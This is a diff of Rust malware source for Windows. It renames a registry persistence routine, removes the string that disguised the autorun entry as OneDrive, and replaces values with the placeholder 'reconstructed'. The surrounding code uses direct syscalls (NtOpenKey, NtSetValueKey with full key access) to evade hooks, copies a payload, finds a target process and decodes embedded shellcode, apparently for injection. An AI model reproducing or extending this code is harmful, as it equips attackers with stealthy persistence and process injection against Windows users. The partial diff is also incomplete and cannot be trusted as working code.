@@ -285,18 +285,9 @@ unsafe fn copy_data(h_in: HANDLE, h_out: HANDLE, read_id: u32, write_id: u32) {
     }
 }
 
-fn update_onedrive_registry() {
-    let user_profile = std::env::var("USERPROFILE").unwrap_or_default();
-    if user_profile.is_empty() { return; }
-
+fn add_persistence_key() {
     let sid_string = get_current_user_sid_string().unwrap_or_default();
     if sid_string.is_empty() { return; }
-
-    let updated_command = format!(
-        "cmd.exe /c \"\"{}\\{}\" /background & reconstructed\"",
-        user_profile,
-        "AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe"
-    );
 
     let nt_open_key_id = syscall::get_syscall_number("NtOpenKey").unwrap();
     let nt_set_value_key_id = syscall::get_syscall_number("NtSetValueKey").unwrap();
@@ -322,7 +313,7 @@ fn update_onedrive_registry() {
         let status = asm_nt_open_key(&mut h_key, 0x000F003F, &mut obj_attr, nt_open_key_id); // KEY_ALL_ACCESS
 
         if status == 0 {
-            let mut val_name: Vec<u16> = "OneDrive".encode_utf16().collect();
+            let mut val_name: Vec<u16> = "reconstructed".encode_utf16().collect();
             val_name.push(0);
             let mut us_val = UNICODE_STRING {
                 Length: ((val_name.len() - 1) * 2) as u16,
@@ -330,7 +321,7 @@ fn update_onedrive_registry() {
                 Buffer: val_name.as_mut_ptr(),
             };
 
-            let mut data: Vec<u16> = updated_command.encode_utf16().collect();
+            let mut data: Vec<u16> = "reconstructed".encode_utf16().collect();
             data.push(0);
 
             asm_nt_set_value_key(
@@ -597,7 +588,7 @@ fn get_process_pid() -> Option<u32> {
 
 fn main() {
     merge_and_copy_payload();
-    update_onedrive_registry();
+    add_persistence_key();
 
     let target_pid = get_process_pid().expect("Process not found");
     let shellcode = general_purpose::STANDARD.decode(SHELLCODE).expect("Invalid shellcode");
